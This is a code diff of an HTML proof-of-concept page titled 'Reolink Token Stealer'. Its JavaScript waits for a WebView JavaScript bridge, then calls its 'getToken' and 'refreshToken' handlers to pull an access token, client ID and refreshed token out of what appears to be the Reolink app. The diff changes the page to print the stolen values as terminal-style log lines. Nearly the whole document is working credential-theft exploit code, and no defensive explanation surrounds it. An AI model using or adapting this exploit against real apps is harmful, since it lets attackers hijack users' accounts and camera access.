@@ -4,41 +4,23 @@
   <title>Token Stealer</title>
   <style>
     body {
-      background: #111;
+      background: #000;
       color: #0f0;
       font-family: monospace;
+      white-space: pre-wrap;
       padding: 20px;
-    }
-    h1 {
-      color: #f00;
-    }
-    .section {
-      margin-bottom: 20px;
-    }
-    .label {
-      color: #0ff;
-    }
-    .value {
-      background: #222;
-      padding: 10px;
-      border: 1px solid #0f0;
-      border-radius: 4px;
-      margin-top: 5px;
+      font-size: 16px;
     }
   </style>
 </head>
 <body>
-  <h1>Reolink Token Stealer</h1>
-  <div class="section">
-    <div class="label">Client ID:</div>
-    <div id="client" class="value">waiting...</div>
-  </div>
-  <div class="section">
-    <div class="label">Access Token:</div>
-    <div id="token" class="value">waiting...</div>
-  </div>
+  <div id="output">[*] Waiting for WebView bridge...</div>
 
   <script>
+    function log(msg) {
+      document.getElementById("output").textContent += "\n" + msg;
+    }
+
     function waitForBridge(callback) {
       if (window.WebViewJavascriptBridge) {
         callback(WebViewJavascriptBridge);
@@ -54,20 +36,36 @@
     }
 
     waitForBridge(function (bridge) {
-      console.log('[*] Bridge Detected!');
+      log("[*] Bridge Detected!");
       bridge.init(function (msg, cb) {
-        console.log('[*] Bridge initialized via init()');
+        log("[*] Bridge initialized via init()");
         cb("ok");
       });
 
-      // 토큰 요청
+      // getToken
       bridge.callHandler("getToken", null, function (res) {
+
         try {
           const obj = JSON.parse(res);
-          document.getElementById("token").textContent = obj.token || "(no token)";
-          document.getElementById("client").textContent = obj.clientId || "(no clientId)";
+          log("[+] Access Token: " + (obj.token || "(no token)"));
+          log("[+] Client ID   : " + (obj.clientId || "(no clientId)"));
+
+          // refreshToken
+          log("[*] Calling refreshToken...");
+          bridge.callHandler("refreshToken", null, function (newRes) {
+            log("[*] refreshToken response:");
+            log(newRes);
+
+            try {
+              const refreshed = JSON.parse(newRes);
+              log("[+] Refreshed Token: " + (refreshed.token || "(no token)"));
+            } catch (e2) {
+              log("[!] Failed to parse refreshToken response.");
+            }
+          });
+
         } catch (e) {
-          document.getElementById("token").textContent = res;
+          log("[!] Failed to parse token response.");
         }
       });
     });
